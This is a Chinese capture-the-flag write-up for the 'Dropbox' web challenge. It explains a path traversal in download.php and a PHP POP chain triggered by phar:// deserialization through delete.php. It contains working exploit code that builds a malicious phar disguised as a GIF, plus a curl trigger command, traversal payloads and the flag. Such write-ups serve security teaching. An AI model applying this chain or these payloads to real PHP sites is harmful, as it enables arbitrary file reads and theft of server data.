---
title: "[CISCN2019 华北赛区 Day1 Web1]Dropbox"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [phar-deserialization, file-download, path-traversal, php-object-injection]
vulnerability: Phar 反序列化漏洞，通过文件下载功能读取源码，利用 phar 协议触发反序列化实现任意文件读取
solved: true
flag: "flag{d4188d0f-a791-4055-8294-5ea3ecf60828}"
---

# [CISCN2019 华北赛区 Day1 Web1]Dropbox

## 题目概述
一个网盘管理系统，支持文件上传、下载和删除功能。用户需要注册登录后才能使用。

## 信息收集
1. 访问题目，自动跳转到 `login.php`，有注册功能
2. 注册登录后进入网盘管理面板，支持上传/下载/删除文件
3. 通过 `download.php` 的路径遍历漏洞下载源码：
   - `filename=../../index.php`
   - `filename=../../class.php`
   - `filename=../../upload.php`
   - `filename=../../delete.php`

## 漏洞分析（漏洞类型、原理、判断过程）

### 1. 路径遍历漏洞
`download.php` 未对 `filename` 参数进行过滤，可使用 `../../` 读取任意文件。

### 2. Phar 反序列化漏洞
分析 `class.php` 发现关键利用链：

```php
class User {
    public $db;
    public function __destruct() {
        $this->db->close();  // 触发点
    }
}

class FileList {
    private $files;
    // __call 魔术方法代理调用
    public function __call($func, $args) {
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
}

class File {
    public $filename;
    public function close() {
        return file_get_contents($this->filename);  // 任意文件读取
    }
}
```

**利用链**：
- `User::__destruct()` → `$this->db->close()`
- `$db` 设为 `FileList` 对象，触发 `FileList::__call('close', [])`
- `FileList::__call()` 调用 `$file->close()`
- `File::close()` 执行 `file_get_contents($this->filename)` 读取任意文件

### 3. Phar 协议触发反序列化
PHP 的 `phar://` 协议在文件操作时会自动反序列化 phar 文件中的 metadata。`delete.php` 中的 `file_exists()` 检查会触发此过程。

## 利用过程（Payload + Flag）

### Step 1: 生成恶意 Phar 文件
```php
<?php
class User { public $db; }
class FileList { private $files; private $results; private $funcs; }
class File { public $filename = "/flag.txt"; }

$file = new File();
$fileList = new FileList();
// 通过反射设置私有属性
$reflection = new ReflectionClass($fileList);
$filesProperty = $reflection->getProperty('files');
$filesProperty->setAccessible(true);
$filesProperty->setValue($fileList, array($file));
// ... 设置其他属性

$user = new User();
$user->db = $fileList;

$phar = new Phar('exploit.phar');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($user);
$phar->addFromString('test.txt', 'test');
?>
```

### Step 2: 上传 Phar 文件
将 `exploit.phar` 重命名为 `exploit.gif`，以 `image/gif` 类型上传。

### Step 3: 触发反序列化
```bash
curl -X POST "http://target/delete.php" -d "filename=phar://exploit.gif"
```

### Step 4: 获取 Flag
返回结果中包含：
```
flag{d4188d0f-a791-4055-8294-5ea3ecf60828}
```

## 复现步骤
1. 注册账号并登录
2. 下载源码分析漏洞
3. 构造恶意 phar 文件（设置 `File::filename` 为 `/flag.txt`）
4. 将 phar 伪装成 gif 上传
5. 通过 `delete.php?filename=phar://exploit.gif` 触发反序列化
6. 从响应中提取 flag

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 路径遍历 | download.php | `filename=../../class.php` | 任意文件读取 |
| Phar 反序列化 | delete.php | `filename=phar://exploit.gif` | POP 链构造 |
| POP 链 | class.php | User→FileList→File | `__destruct`→`__call`→`close()` |

## 知识总结

1. **Phar 反序列化触发点**：`file_exists()`、`is_file()`、`is_dir()`、`file_get_contents()` 等文件函数在处理 `phar://` 协议时会触发反序列化

2. **POP 链构造技巧**：
   - 寻找 `__destruct()` 或 `__wakeup()` 作为入口
   - 利用 `__call()` 进行方法代理
   - 找到危险方法如 `file_get_contents()`、`system()` 等

3. **文件上传绕过**：通过修改 Content-Type 和扩展名绕过简单校验
